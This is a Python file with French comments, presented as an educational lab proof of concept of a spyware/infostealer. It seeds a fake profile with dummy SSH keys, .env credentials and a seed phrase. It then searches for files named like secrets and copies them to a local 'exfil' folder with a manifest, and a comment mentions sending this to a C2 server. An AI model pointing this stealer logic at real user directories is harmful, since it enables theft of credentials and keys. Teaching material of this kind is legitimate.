#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dossier: Ware - Étape 02: Spyware / Infostealer (PoC Éducatif)
Intention: Al-Basir (Développer la clairvoyance pour sécuriser l'invisible)
Description: Simule la recherche, la centralisation et l'analyse de fichiers
             sensibles (clés de config, clés SSH simulées) dans un dossier cible.
"""

import json
import os
import shutil
from datetime import datetime

# Configuration du laboratoire
TARGET_LAB_DIR = "./fake_user_profile"  # Le dossier à auditer (simulé)
EXFIL_DIR = "./exfil_dropzone"  # La zone de centralisation du spyware


def setup_fake_environment():
    """Crée un environnement de test isolé avec de faux secrets à découvrir."""
    if not os.path.exists(TARGET_LAB_DIR):
        os.makedirs(f"{TARGET_LAB_DIR}/.ssh", exist_ok=True)
        os.makedirs(f"{TARGET_LAB_DIR}/config", exist_ok=True)

        # Simulation d'une clé SSH privée oubliée
        with open(f"{TARGET_LAB_DIR}/.ssh/id_rsa", "w") as f:
            f.write(
                "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                "Fausse_Cle_SSH_De_Test_Pour_Le_Lab_Nour\n"
                "-----END OPENSSH PRIVATE KEY-----"
            )

        # Simulation d'un fichier d'environnement de production
        with open(f"{TARGET_LAB_DIR}/config/.env", "w") as f:
            f.write(
                "DB_HOST=127.0.0.1\n"
                "DB_USER=admin\n"
                "DB_PASSWORD=change-me-for-lab\n"
                "API_TOKEN=demo-token-for-lab"
            )

        # Simulation d'un fichier de notes contenant des données sensibles
        with open(f"{TARGET_LAB_DIR}/notes_crypto.txt", "w") as f:
            f.write(
                "Ma phrase de récupération secrète : "
                "pomme table horizon guitare azur univers"
            )


def launch_stealer():
    """Scanne l'environnement cible, identifie et centralise les données."""
    print("=" * 60)
    print(" [!] Initialisation du PoC Infostealer (Analyse Active) ")
    print(f" Source d'analyse : {TARGET_LAB_DIR}")
    print(f" Destination de centralisation : {EXFIL_DIR}")
    print("=" * 60)

    if os.path.exists(EXFIL_DIR):
        shutil.rmtree(EXFIL_DIR)
    os.makedirs(EXFIL_DIR)

    report = {
        "timestamp": datetime.now().isoformat(),
        "files_exfiltrated": [],
        "sensitive_match_count": 0,
    }

    # Critères de ciblage (extensions et mots-clés sémantiques)
    target_patterns = ["id_rsa", ".env", "crypto", "password", "secret"]

    # Parcours récursif du dossier (Arborescence)
    for root, dirs, files in os.walk(TARGET_LAB_DIR):
        for file in files:
            file_path = os.path.join(root, file)

            # Analyse heuristique basique : le nom ou l'extension matche-t-il nos cibles ?
            if any(pattern in file.lower() for pattern in target_patterns):
                print(f"[🔍 DECOUVERTE] Fichier sensible identifié : {file_path}")

                # Copie sécurisée vers la zone de centralisation (Dropzone)
                dest_name = f"exfil_{file}_{len(report['files_exfiltrated'])}"
                dest_path = os.path.join(EXFIL_DIR, dest_name)
                shutil.copy2(file_path, dest_path)

                report["files_exfiltrated"].append(
                    {
                        "original_path": file_path,
                        "extracted_as": dest_name,
                        "size_bytes": os.path.getsize(file_path),
                    }
                )
                report["sensitive_match_count"] += 1

    # Génération du rapport final d'exfiltration (généralement envoyé au serveur C2 externe)
    with open(
        os.path.join(EXFIL_DIR, "exfil_manifest.json"), "w", encoding="utf-8"
    ) as f:
        json.dump(report, f, indent=4, ensure_ascii=False)

    print("\n" + "=" * 60)
    print(
        f" [✅] Analyse terminée. "
        f"{report['sensitive_match_count']} fichiers centralisés."
    )
    print(
        f" Consultez le dossier '{EXFIL_DIR}' pour analyser les données "
        f"collectées."
    )
    print("=" * 60)


if __name__ == "__main__":
    # 1. Préparation des fausses données pour le laboratoire
    setup_fake_environment()
    # 2. Exécution de la simulation de vol de données
    launch_stealer()
